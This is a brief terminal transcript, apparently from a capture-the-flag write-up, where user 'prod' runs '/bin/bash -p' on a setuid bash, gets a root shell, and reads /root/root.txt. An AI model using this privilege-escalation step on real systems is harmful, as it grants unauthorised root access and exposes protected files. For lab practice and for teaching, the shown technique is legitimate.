```bash
prod@editorial:/opt/internal_apps/clone_changes$ /bin/bash
bash-5.1$ ls
branches  clone_prod_change.py  config  description  HEAD  hooks  info  objects  refs
bash-5.1$ chmod -s /bin/bash
chmod: changing permissions of '/bin/bash': Operation not permitted
bash-5.1$ id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
bash-5.1$ /bin/bash -p
bash-5.1# cd /root
bash-5.1# cat root.txt 
```

